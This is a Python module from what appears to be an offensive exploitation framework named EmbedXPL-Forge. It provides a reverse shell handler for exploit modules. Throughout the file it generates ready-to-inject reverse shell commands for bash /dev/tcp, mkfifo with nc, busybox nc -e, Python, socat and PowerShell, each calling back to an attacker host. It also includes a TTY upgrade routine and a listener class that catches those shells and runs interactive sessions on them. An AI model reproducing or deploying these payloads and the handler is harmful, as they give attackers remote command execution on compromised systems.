"""
EmbedXPL-Forge - Core Shell Handler
Provides interactive reverse shell handler with TTY upgrade, logging and
session management for exploit modules.

Usage in exploit modules:
    from embedxpl.core.shells import ShellHandler, spawn_reverse_shell_payloads

    # In run():
    if self.destructive_gate:
        handler = ShellHandler(lhost=str(self.lhost), lport=int(self.lport))
        handler.listen(on_connect=lambda conn, addr: handler.interact(conn))

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import logging
import os
import select
import socket
import sys
import threading
import time
from typing import Callable, Optional

logger = logging.getLogger(__name__)

# ============================================================
# Reverse shell payloads - multi-architecture / multi-OS
# ============================================================

def reverse_shell_payload(lhost: str, lport: int, shell_type: str = "auto") -> str:
    """
    Return a reverse shell command string for the target platform.

    shell_type options:
      auto      - tries mkfifo first, falls back to bash/python
      bash      - bash /dev/tcp
      mkfifo    - mkfifo + nc (most reliable on embedded Linux)
      python3   - Python3 socket
      python2   - Python2 socket
      busybox   - busybox netcat (common on IoT/embedded)
      socat     - socat PTY (gives full TTY)
      powershell- Windows PowerShell

    Returns: shell command string ready to inject
    """
    payloads = {
        "mkfifo": (
            f"rm -f /tmp/.f; mkfifo /tmp/.f; "
            f"cat /tmp/.f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/.f"
        ),
        "bash": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "python3": (
            f"python3 -c \"import socket,os,pty;"
            f"s=socket.socket();s.connect(('{lhost}',{lport}));"
            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            f"pty.spawn('/bin/sh')\""
        ),
        "python2": (
            f"python -c \"import socket,subprocess,os;"
            f"s=socket.socket();s.connect(('{lhost}',{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call(['/bin/sh','-i'])\""
        ),
        "busybox": f"busybox nc {lhost} {lport} -e /bin/sh",
        "socat": (
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
            f"tcp:{lhost}:{lport}"
        ),
        "powershell": (
            f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
            f"$e=([text.encoding]::ASCII).GetBytes($r2);$s.Write($e,0,$e.Length)}}\""
        ),
        "auto": (
            f"(mkfifo /tmp/.f 2>/dev/null; "
            f"cat /tmp/.f|/bin/sh -i 2>&1|nc {lhost} {lport}>/tmp/.f) || "
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' 2>/dev/null || "
            f"python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('{lhost}',{lport}));"
            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')\" 2>/dev/null"
        ),
    }
    return payloads.get(shell_type, payloads["auto"])


def tty_upgrade_commands() -> list[str]:
    """
    Return a sequence of commands to upgrade a dumb shell to a full TTY.
    Send these after getting initial connection.
    """
    return [
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
        "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
        "/usr/bin/script -qc /bin/bash /dev/null",
        # Stty settings (sent from local side after Ctrl+Z)
        # User should run: stty raw -echo; fg
    ]


# ============================================================
# Shell Handler - TCP listener with interactive session
# ============================================================

class ShellHandler:
    """
    TCP listener that catches a reverse shell and provides
    an interactive session with TTY upgrade support.
    """

    def __init__(self, lhost: str = "0.0.0.0", lport: int = 4444, timeout: int = 30):
        self.lhost = lhost
        self.lport = lport
        self.timeout = timeout
        self._server: Optional[socket.socket] = None
        self._session: Optional[socket.socket] = None

    def listen(
        self,
        on_connect: Optional[Callable] = None,
        auto_interact: bool = True,
    ) -> Optional[socket.socket]:
        """
        Start TCP listener and wait for incoming connection.

        Args:
            on_connect: Callback(conn, addr) when shell connects.
            auto_interact: If True, automatically enter interactive mode.

        Returns:
            Connected socket or None if timeout.
        """
        try:
            self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server.bind((self.lhost, self.lport))
            self._server.listen(1)
            self._server.settimeout(self.timeout)

            logger.info("[SHELL HANDLER] Listening on %s:%d (timeout=%ds)",
                       self.lhost, self.lport, self.timeout)
            print(f"\n[*] Waiting for reverse shell on {self.lhost}:{self.lport}...")

            conn, addr = self._server.accept()
            self._session = conn

            logger.info("[SHELL HANDLER] Connection from %s:%d", addr[0], addr[1])
            print(f"\n[+] Shell received from {addr[0]}:{addr[1]}")

            if on_connect:
                on_connect(conn, addr)
            elif auto_interact:
                self.interact(conn)

            return conn

        except socket.timeout:
            print(f"\n[-] No connection received within {self.timeout}s")
            logger.warning("[SHELL HANDLER] Timeout waiting for connection")
            return None
        except Exception as exc:
            logger.error("[SHELL HANDLER] Error: %s", exc)
            return None
        finally:
            if self._server:
                try:
                    self._server.close()
                except Exception:
                    pass

    def interact(self, conn: socket.socket) -> None:
        """
        Enter interactive mode with the shell session.
        Provides bidirectional I/O between user terminal and remote shell.
        Supports Ctrl+C forwarding, Ctrl+D to exit.
        """
        print("\n[*] Interactive shell. Press Ctrl+C twice or type 'exit' to quit.\n")
        print("    Tip: Run 'python3 -c \"import pty; pty.spawn(\\'bash\\')\"' for full TTY\n")

        conn.settimeout(0.1)
        try:
            while True:
                r, _, _ = select.select([conn, sys.stdin], [], [], 0.1)

                if conn in r:
                    try:
                        data = conn.recv(4096)
                        if not data:
                            print("\n[!] Connection closed by remote host")
                            break
                        sys.stdout.write(data.decode("utf-8", errors="replace"))
                        sys.stdout.flush()
                    except socket.timeout:
                        pass
                    except Exception:
                        break

                if sys.stdin in r:
                    try:
                        user_input = sys.stdin.read(1)
                        if not user_input:
                            break
                        conn.send(user_input.encode())
                    except Exception:
                        break

        except KeyboardInterrupt:
            print("\n[*] Exiting shell interaction (connection kept alive)")
        finally:
            print("\n[*] Returning to EmbedXPL console")

    def send_command(self, conn: socket.socket, cmd: str, wait_ms: int = 500) -> str:
        """Send a command and wait for output."""
        try:
            conn.send((cmd + "\n").encode())
            time.sleep(wait_ms / 1000)
            conn.settimeout(0.5)
            output = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    output += chunk
            except socket.timeout:
                pass
            return output.decode("utf-8", errors="replace")
        except Exception as exc:
            logger.debug("send_command failed: %s", exc)
            return ""

    def upgrade_tty(self, conn: socket.socket) -> None:
        """Send TTY upgrade commands to the shell."""
        cmds = tty_upgrade_commands()
        for cmd in cmds:
            self.send_command(conn, cmd, wait_ms=800)
        print("[*] TTY upgrade sent. If it worked, you have a proper PTY.")

    def background_listen(self, callback: Optional[Callable] = None) -> threading.Thread:
        """Start listener in a background thread."""
        def _thread():
            self.listen(on_connect=callback, auto_interact=callback is None)

        t = threading.Thread(target=_thread, daemon=True, name="exf-shell-handler")
        t.start()
        return t
